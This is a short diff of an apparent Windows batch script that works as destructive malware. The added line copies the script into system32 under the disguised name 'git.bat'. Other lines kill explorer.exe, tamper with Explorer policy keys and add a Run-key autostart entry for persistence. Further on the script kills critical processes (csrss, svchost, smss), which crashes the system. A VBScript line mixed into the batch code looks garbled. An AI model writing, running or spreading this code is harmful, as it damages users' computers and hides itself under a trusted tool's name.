@@ -10,7 +10,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
-
+copy ""%0"" "C:\Windows\system32\git.bat"
 taskkill /f /im explorer.exe 
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\git.bat /f
@@ -656,7 +656,6 @@ timeout 20 /nobreak
 taskkill /im csrss.exe
 taskkill /im svchost.exe
 taskkill /im smss.exe 
-
 
 
 
